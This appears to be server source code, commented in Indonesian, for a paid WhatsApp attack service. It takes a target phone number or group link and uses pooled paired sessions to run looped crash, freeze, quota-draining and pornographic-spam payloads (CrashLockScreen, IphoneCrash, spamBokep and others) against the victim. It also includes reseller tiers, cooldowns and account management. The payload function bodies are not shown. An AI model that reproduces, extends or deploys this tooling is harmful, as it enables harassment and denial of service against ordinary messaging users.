  if (isProcessing || requestQueue.length === 0) return;
  isProcessing = true;

  while (requestQueue.length > 0) {
    const { task, resolve, reject } = requestQueue.shift();
    try {
      const result = await task();
      resolve(result);
    } catch (err) {
      reject(err);
    }
    await sleep(500); // jeda antar task
  }

  isProcessing = false;
}

function addToQueue(task) {
  return new Promise((resolve, reject) => {
    requestQueue.push({ task, resolve, reject });
    processQueue();
  });
}
app.get("/queueStatus", (req, res) => {
  res.json({
    queued: requestQueue.length,
    processing: isProcessing
  });
});
app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
  console.log(`[📤 BUG] Send request for ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 150,
    reseller: 180,
    admin: 1,
    owner: 1,
    vip: 70,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    saveUserLog(
      user.username,
      "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Role: ${user.role}`
    );

    const isMessBug = false;
const withTimeout = (promise, ms = 30000) =>
  Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Timed Out")), ms)
    )
  ]);
  
    const attemptSend = async (sock, retry = false) => {
      try {
        let targetJid = "";
        const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;

        if (groupRegex.test(target)) {
          // ... Logic Group (Sama seperti sebelumnya) ...
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🚀] Mode Group. Invite Code: ${inviteCode}`);

          let groupInfo;
          try {
            groupInfo = await sock.groupGetInviteInfo(inviteCode);
          } catch (e) {
            throw new Error("Invite group invalid / expired");
          }

          targetJid = groupInfo.id;
          console.log(`[👥] Group JID: ${targetJid}`);

          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group success`);
          } catch (e) {
            console.log(`[⚠️] Already joined / join skipped`);
          }

        } else if (target.endsWith("@g.us")) {
          targetJid = target;
          console.log(`[👥] Target Group JID langsung`);

        } else {
          const cleanNumber = target.replace(/\D/g, "");
          targetJid = cleanNumber + "@s.whatsapp.net";
          console.log(`[📞] Mode Nomor: ${targetJid}`);
        }

        // --- KIRIM BUG (Switch Case) ---
        switch (bug) {
         
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${targetJid}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);

        if (!retry) {
          // Retry Logic
          if (user.role === 'vip') {
            // Retry: Ambil ulang dari gabungan VIP & Personal
            const availableSocks = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join('permenmd', user.username);

            if (fs.existsSync(vipPath)) availableSocks.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) availableSocks.push(...getActiveSocketsFromPath(userPath));

            if (availableSocks.length > 0) {
              const retrySock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
              return await attemptSend(retrySock, true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}, ${err.message}`);
        return false;
      }
    };

        // --- LOGIC PEMILIHAN SENDER (UPDATE) ---
    let sock;
    const senderMode = req.query.senderMode || 'private'; // Ambil mode dari query

    if (senderMode === 'global') {
      // MODE GLOBAL: Ambil sender dari SEMUA folder user di permenmd
      let availableSocks = [];
      const baseDir = path.join(__dirname, 'permenmd');

      if (fs.existsSync(baseDir)) {
        const allUsers = fs.readdirSync(baseDir).filter(p => {
          return fs.lstatSync(path.join(baseDir, p)).isDirectory();
        });

        // Scan semua folder user
        for (const u of allUsers) {
          const uPath = path.join(baseDir, u);
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) {
              availableSocks.push(activeConnections[sessionName]);
            }
          });
        }
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Global Mode: Tidak ada koneksi aktif dari manapun.`);
        return;
      }

      // Pilih acak dari semua user yang aktif
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
      console.log(`[🌍 GLOBAL SENDER] Menggunakan sender acak. Total Global Active: ${availableSocks.length}`);

    } else if (user.role === 'vip') {
      // VIP: Gabungkan sender dari folder VIP dan folder permenmd/[username]
      let availableSocks = [];
      const vipPath = path.join(__dirname, 'vip');
      if (fs.existsSync(vipPath)) {
        availableSocks.push(...getActiveSocketsFromPath(vipPath));
      }
      const userPath = path.join('permenmd', user.username);
      if (fs.existsSync(userPath)) {
        availableSocks.push(...getActiveSocketsFromPath(userPath));
      }

      if (availableSocks.length === 0) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif di VIP Pool atau folder pribadi ${user.username}.`);
        return;
      }
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];

    } else {
      // MODE PRIVATE (DEFAULT MEMBER): Ambil sock dari folder user sendiri
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌ NO SOCK] Tidak ada koneksi aktif tersedia di folder member ${user.username}.`);
        return;
      }
    }

    // ✅ SESUDAH

  await attemptSend(sock)

  });
});
app.get("/sendBug", async (req, res) => {
  // ═══════════════════════════════════════════════════════════
  // WRAPPER TRY-CATCH UTAMA - MENCEGAH SERVER CRASH TANPA RESPONSE
  // ═══════════════════════════════════════════════════════════
  try {
    const { key, bug } = req.query;
    let { target } = req.query;
    const senderMode = req.query.senderMode || 'private';

    console.log('═══════════════════════════════════════');
    console.log(`[📤 BUG] Request received`);
    console.log(`[📤 BUG] Key: ${key}`);
    console.log(`[📤 BUG] Target: ${target}`);
    console.log(`[📤 BUG] Bug: ${bug}`);
    console.log(`[📤 BUG] SenderMode: ${senderMode}`);

    // ── VALIDASI KEY ───────────────────────────────────
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
      console.log("[❌ BUG] Key tidak valid.");
      return res.json({ valid: false });
    }

    // ── CARI USER ──────────────────────────────────────
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
      console.log("[❌ BUG] User tidak ditemukan.");
      return res.json({ valid: false });
    }

    console.log(`[📤 BUG] User: ${user.username} | Role: ${user.role}`);

    // ── COOLDOWN CHECK ─────────────────────────────────
    const roleCooldowns = {
      member: 150,
      reseller: 180,
      admin: 1,
      owner: 1,
      vip: 70,
    };
    const role = user.role || "member";
    const cooldownSeconds = roleCooldowns[role] || 60;

    if (!user.lastSend) user.lastSend = 0;

    const now = Date.now();
    const diffSeconds = Math.floor((now - user.lastSend) / 1000);
    
    if (diffSeconds < cooldownSeconds) {
      console.log(`[⏳ BUG] ${user.username} Still Cooldown - wait ${cooldownSeconds - diffSeconds}s`);
      return res.json({
        valid: true,
        sended: false,
        cooldown: true,
        wait: cooldownSeconds - diffSeconds,
      });
    }

    // ── CEK SOCK AVAILABILITY SEBELUM RESPONSE ─────────
    console.log(`[🔍 BUG] Checking socket availability for mode: ${senderMode}`);
    
    let sock = null;
    let sockSource = '';
    
    if (senderMode === 'global') {
      // MODE GLOBAL
      let availableSocks = [];
      const baseDir = path.join(__dirname, 'permenmd');

      if (fs.existsSync(baseDir)) {
        const allUsers = fs.readdirSync(baseDir).filter(p => {
          return fs.lstatSync(path.join(baseDir, p)).isDirectory();
        });

        for (const u of allUsers) {
          const uPath = path.join(baseDir, u);
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) {
              availableSocks.push(activeConnections[sessionName]);
            }
          });
        }
      }

      if (availableSocks.length === 0) {
        console.log(`[❌ BUG] Global Mode: Tidak ada koneksi aktif`);
        return res.json({
          valid: true,
          sended: false,
          cooldown: false,
          error: 'NO_GLOBAL_SOCKET',
          message: 'Tidak ada sender global yang aktif'
        });
      }

      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
      sockSource = `GLOBAL (${availableSocks.length} active)`;
      console.log(`[🌍 GLOBAL SENDER] Selected from ${sockSource}`);

    } else if (user.role === 'vip') {
      // MODE VIP - Gabungan VIP + Personal
      let availableSocks = [];
      const vipPath = path.join(__dirname, 'vip');
      if (fs.existsSync(vipPath)) {
        availableSocks.push(...getActiveSocketsFromPath(vipPath));
      }
      const userPath = path.join('permenmd', user.username);
      if (fs.existsSync(userPath)) {
        availableSocks.push(...getActiveSocketsFromPath(userPath));
      }

      if (availableSocks.length === 0) {
        console.log(`[❌ BUG] VIP Mode: Tidak ada koneksi aktif di VIP Pool atau folder ${user.username}`);
        return res.json({
          valid: true,
          sended: false,
          cooldown: false,
          error: 'NO_VIP_SOCKET',
          message: 'Tidak ada sender VIP yang aktif'
        });
      }
      
      sock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
      sockSource = `VIP POOL (${availableSocks.length} active)`;
      console.log(`[👑 VIP SENDER] Selected from ${sockSource}`);

    } else {
      // MODE PRIVATE
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.log(`[❌ BUG] Private Mode: Tidak ada koneksi aktif di folder ${user.username}`);
        return res.json({
          valid: true,
          sended: false,
          cooldown: false,
          error: 'NO_PRIVATE_SOCKET',
          message: 'Tidak ada sender private yang aktif'
        });
      }
      sockSource = `PRIVATE (${user.username})`;
      console.log(`[🔒 PRIVATE SENDER] Selected from ${sockSource}`);
    }

    // ── SET COOLDOWN & SAVE ────────────────────────────
    user.lastSend = now;
    try {
      saveDatabase(db);
      console.log(`[✅ BUG] Cooldown set & database saved`);
    } catch (dbErr) {
      console.error(`[⚠️ BUG] Failed to save database: ${dbErr.message}`);
      // Tetap lanjutkan, cuma log error
    }

    // ── KIRIM RESPONSE SUKSES ──────────────────────────
    console.log(`[✅ BUG] Sending success response`);
    res.json({
      valid: true,
      sended: true,
      cooldown: false,
      role: role,
      senderMode: senderMode,
      sockSource: sockSource
    });

    // ── PROSES DI BACKGROUND ───────────────────────────
    setImmediate(async () => {
      try {
        console.log(`[🚀 BG] Starting background send to ${target}`);
        
        saveUserLog(
          user.username,
          "bug",
          `Kirim Bug: ${bug.toUpperCase()}`,
          `Target: ${target} | Mode: ${senderMode} | Source: ${sockSource} | Role: ${user.role}`
        );

        await attemptSend(sock, target, bug, user);

        console.log(`[✅ BG] Background send completed`);
      } catch (bgErr) {
        console.error(`[❌ BG] Background send error: ${bgErr.message}`);
      }
    });

  } catch (mainErr) {
    // ═══════════════════════════════════════════════════════
    // CATCH ALL ERROR - PASTI ADA RESPONSE
    // ═══════════════════════════════════════════════════════
    console.error('═══════════════════════════════════════');
    console.error('[💀 FATAL] Unhandled error in /sendBug:');
    console.error(mainErr);
    console.error('═══════════════════════════════════════');
    
    // Cek apakah response sudah dikirim
    if (!res.headersSent) {
      res.status(500).json({
        valid: false,
        error: 'INTERNAL_ERROR',
        message: mainErr.message
      });
    }
  }
});

// ═══════════════════════════════════════════════════════════════
// FUNGSI attemptSend (DIPISAHKAN)
// ═══════════════════════════════════════════════════════════════
async function attemptSend(sock, target, bug, user) {
  try {
    let targetJid = "";
    const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;

    if (groupRegex.test(target)) {
      const inviteCode = target.match(groupRegex)[1];
      console.log(`[🚀] Mode Group. Invite Code: ${inviteCode}`);

      let groupInfo;
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
      } catch (e) {
        throw new Error("Invite group invalid / expired");
      }

      targetJid = groupInfo.id;
      console.log(`[👥] Group JID: ${targetJid}`);

      try {
        await sock.groupAcceptInvite(inviteCode);
        console.log(`[✅] Join group success`);
      } catch (e) {
        console.log(`[⚠️] Already joined / join skipped`);
      }

    } else if (target.endsWith("@g.us")) {
      targetJid = target;
      console.log(`[👥] Target Group JID langsung`);

    } else {
      const cleanNumber = target.replace(/\D/g, "");
      targetJid = cleanNumber + "@s.whatsapp.net";
      console.log(`[📞] Mode Nomor: ${targetJid}`);
    }

    // ── KIRIM BUG ──────────────────────────────────────
    console.log(`[🐛] Executing bug: ${bug}`);
    
    switch (bug) {
        case "layinvisible":
      for (let i = 0; i < 100; i++) {
        await convQtd(sock, targetJid);
        await delayerhard(sock, targetJid);
        await xofm(sock, targetJid);
        await BulldozerQuota(sock, targetJid);
        await BlankFreeze(sock, targetJid);
        await CrashLockScreen(sock, targetJid);
        await BulldozerQuotaV2(sock, targetJid);
        await Delayultimate(sock, targetJid);
        await unknowbuts(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "frame":
      for (let i = 0; i < 200; i++) {
        await convQtd(sock, targetJid);
        await delayerhard(sock, targetJid);
        await FreezeHard(sock, targetJid);
        await Delayultimate(sock, targetJid);
        await BulldozerQuotaV2(sock, targetJid);
        await RaP(sock, targetJid);
        await LocatonStc(sock, targetJid);
        await locxX(sock, targetJid);
        await BlankFreeze(sock, targetJid);
        await blankPACKING(sock, targetJid);
        await kontolbapalu(sock, targetJid);
        await StuckLogo(sock, targetJid);
        await CrashLockScreen(sock, targetJid);
        await xofm(sock, targetJid);
        await unknowbuts(sock, targetJid);
        await sleep(4000);
      }
      break;
    case "fc":
      for (let i = 0; i < 80; i++) {
        await fcmessages(sock, targetJid);
        await FreezeHard(sock, targetJid);
        await BlankFreeze(sock, targetJid);
        await xlocCLog(sock, targetJid);
        await sleep(1500);
      }
      break;
    case "delay":
      for (let i = 0; i < 150; i++) {
        await convQtd(sock, targetJid);
        await Delayultimate(sock, targetJid);
        await delayerhard(sock, targetJid);
        await xofm(sock, targetJid);
        await BlankFreeze(sock, targetJid);
        await convQtd(sock, targetJid);
        await unknowbuts(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "Delayultimate":
      for (let i = 0; i < 150; i++) {
        await Delayultimate(sock, targetJid);
        await delayerhard(sock, targetJid);
        await BlankFreeze(sock, targetJid);
        await CrashLockScreen(sock, targetJid);
        await xofm(sock, targetJid);
        await unknowbuts(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "over":
      for (let i = 0; i < 200; i++) {
        await convQtd(sock, targetJid);
        await BlankFreeze(sock, targetJid);
        await CrashLockScreen(sock, targetJid);
        await delayerhard(sock, targetJid);
        await xofm(sock, targetJid);
        await unknowbuts(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "buldog":
      for (let i = 0; i < 80; i++) {
        await BulldozerQuota(sock, targetJid);
        await BulldozerQuotaV2(sock, targetJid);        
        await BulldozerQuotaV3(sock, targetJid);
        await convQtd(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "spam_call":
     for (let i = 0; i < 20; i++) {
      await CrashLockScreen(sock, targetJid);
      await BlankFreeze(sock, targetJid);
      await RaP(sock, targetJid);
      await LocatonStc(sock, targetJid);
      await crashuix(sock, targetJid);
      await BlankChatnoctra(sock, targetJid);
      await XST44(sock, targetJid);
      await RaP(sock, targetJid);
      await nativeFrz(sock, targetJid);
      await sleep(2000);
      }
      break;
    case "hard":
     for (let i = 0; i < 30; i++) {
      await CrashLockScreen(sock, targetJid);
      await LocatonStc(sock, targetJid);
      await locxX(sock, targetJid);
      await FreezeHard(sock, targetJid);
      await GlxButton(sock, targetJid);
      await RaP(sock, targetJid);
      await crashuix(sock, targetJid);
      await BlankChatnoctra(sock, targetJid);
      await sleep(2000);
      }
      break;
    case "dozer":
      for (let i = 0; i < 100; i++) {
        await BulldozerQuota(sock, targetJid);
        await BulldozerQuotaV2(sock, targetJid);        
        await BulldozerQuotaV3(sock, targetJid);
        await delayerhard(sock, targetJid);
        await convQtd(sock, targetJid);
        await sleep(5000);
      }
      break;
    case "freeze":
      for (let i = 0; i < 30; i++) {
      await locxX(sock, targetJid);
      await FreezeHard(sock, targetJid);
      await GlxButton(sock, targetJid);
      await RaP(sock, targetJid);
      await crashuix(sock, targetJid);
      await BlankChatnoctra(sock, targetJid);
      await sleep(3000);
      }
      break;
    case "bokep":
      for (let i = 0; i < 40; i++) {
        await spamBokep(sock, targetJid);
        await sleep(100);
      }
      break;
    case "bokep":
      for (let i = 0; i < 50; i++) {
        await spamHentai(sock, targetJid);
        await sleep(100);
      }
      break;
    case "spamVideo":
      for (let i = 0; i < 50; i++) {
        await spamVideo(sock, targetJid);
        await spamBokep(sock, targetJid);
        await Delayultimate(sock, targetJid);
        await delayerhard(sock, targetJid);
        await sleep(100);
      }      
      break;
    case "combo":
      for (let i = 0; i < 10; i++) {
      await CrashLockScreen(sock, targetJid);
      await BlankFreeze(sock, targetJid);
      await RaP(sock, targetJid);
      await LocatonStc(sock, targetJid);
      await crashuix(sock, targetJid);
      await locxX(sock, targetJid);
      await FreezeHard(sock, targetJid);
      await GlxButton(sock, targetJid);
      await BlankChatnoctra(sock, targetJid);
      await sleep(3000);
      }
      break;
    case "stuck":
      for (let i = 0; i < 30; i++) {
        await blankPACKING(sock, targetJid);
        await kontolbapalu(sock, targetJid);
        await StuckLogo(sock, targetJid);
        await sleep(3000);
      }
      break;
    case "fc_ios":
      for (let i = 0; i < 100; i++) {
        await iosQsx(sock, targetJid);
        await ExIOS(sock, targetJid);
        await PahinaApple(sock, targetJid);
        await blankPACKING(sock, targetJid);
        await kontolbapalu(sock, targetJid);
        await StuckLogo(sock, targetJid);
        await sleep(1500);
      }
      break;
    case "crash_ios":
      for (let i = 0; i < 100; i++) {
        await blankIosNewest(sock, targetJid);
        await UIHard(sock, targetJid);
        await IphoneCrash(sock, targetJid);
        await PahinaApple(sock, targetJid);
        await iosCtt(sock, targetJid);
        await bawsflow(sock, targetJid);
        await sleep(1500);
      }
      break;
    case "kill_ios":
      for (let i = 0; i < 30; i++) {
        await freezeios(sock, targetJid);
        await PahinaApple(sock, targetJid);
        await iosCtt(sock, targetJid);
        await bawsflow(sock, targetJid);
        await blankIosNewest(sock, targetJid);
        await sleep(2000);
       
      }
    
      break;
      case "freeze":
      for (let i = 0; i < 20; i++) {
        await FrezeChatBum(sock, targetJid);
        await sleep(1500);
        await DelayRtr(sock, targetJid);
      }
      break;
    case "fc":
      for (let i = 0; i < 20; i++) {
        await crashX(sock, targetJid);
        await sleep(1500);
      }
      break;
    case "delays":
      for (let i = 0; i < 50; i++) {
        await Spamdelay(sock, targetJid);
        await sleep(1500);
        await DelayRtr(sock, targetJid);
      }
      break;
    case "delay":
      for (let i = 0; i < 70; i++) {
        await executedV10Back(sock, targetJid);
        await sleep(1500);
        await DelayRtr(sock, targetJid);
      }
      break;
    case "frz":
      for (let i = 0; i < 20; i++) {
        await FrezeBum(sock, targetJid);
        await sleep(1500);
        await DelayRtr(sock, targetJid);
      }
      break;
    case "blank":
      for (let i = 0; i < 20; i++) {
        await Blank(sock, targetJid);
        await sleep(1500);
        await DelayRtr(sock, targetJid);
      }
      break;
      case "lock_group":
        for (let i = 0; i < 10; i++) {
          await fcGrup(sock, targetJid);
        }
        await sock.groupLeave(targetJid);
        await sock.chatModify({
          delete: true,
          lastMessages: [{
            key: {
              remoteJid: targetJid,
              fromMe: true,
              id: "1"
            },
            messageTimestamp: Date.now()
          }]
        }, targetJid);
        break;
        
      default:
        console.warn(`[⚠️] Unknown bug type: ${bug}`);
        throw new Error(`Unknown bug type: ${bug}`);
    }

    console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${targetJid}`);
    return true;

  } catch (err) {
    console.warn(`[⚠️ SEND ERROR] ${err.message}`);
    
    // Retry logic untuk VIP
    if (user.role === 'vip') {
      console.log(`[🔄 RETRY] Attempting VIP retry...`);
      const availableSocks = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join('permenmd', user.username);

      if (fs.existsSync(vipPath)) availableSocks.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) availableSocks.push(...getActiveSocketsFromPath(userPath));

      if (availableSocks.length > 0) {
        const retrySock = availableSocks[Math.floor(Math.random() * availableSocks.length)];
        console.log(`[🔄 RETRY] Using different socket`);
        return await attemptSend(retrySock, target, bug, user);
      }
    } else {
      const retrySock = await checkActiveSessionInFolder(user.username);
      if (retrySock) {
        console.log(`[🔄 RETRY] Using different socket`);
        return await attemptSend(retrySock, target, bug, user);
      }
    }
    
    console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}, ${err.message}`);
    return false;
  }
}

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return array kosong
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /getSenderStats
// Mengembalikan jumlah sender aktif untuk user sendiri (Private) dan total semua user (Global)
app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    // 1. Hitung Private (permenmd/username)
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    // 2. Hitung Global (Semua folder di permenmd)
    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];

  if (user.role === 'vip') {
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    // 1. Ambil dari folder VIP (Root)
    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith(".json"));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    // 2. Ambil dari folder permenmd/[username]
    const userPath = path.join('permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }

  } else {
    // User biasa hanya melihat sender di folder usernya sendiri
    console.log(`[${user.username}] Request mySender (Member Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    const baseDir = path.join("permenmd", user.username)
    const sessionDir = path.join(baseDir, number)

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          await pairingWa(number, user.username)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "LANZNIEH")
      if (code) {
        return res.json({ valid: true, number, pairingCode: code })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Hanya Owner yang bisa manage akun via Aplikasi." });
}

  // --- CEK LIMIT BULANAN ---
  const roleLimits = {
    owner: 100,
    admin: 80,
    reseller: 30
  };

  const currentLimit = roleLimits[creator.role];
  const currentMonth = new Date().toISOString().slice(0, 7); // Format "YYYY-MM"

  // Inisialisasi log penggunaan jika belum ada, atau reset jika bulan baru
  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  // ✅ TAMBAHKAN PENGGUNA KE DB
  db.push(newAccount);

  // ✅ TAMBAHKAN COUNTER LIMIT KEPADA CREATOR
  creator.usageLog.count++;

  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }
    
  if (!deleter || deleter.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Hanya Owner yang bisa manage akun via Aplikasi." });
}

  // Lakukan penghapusan
  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

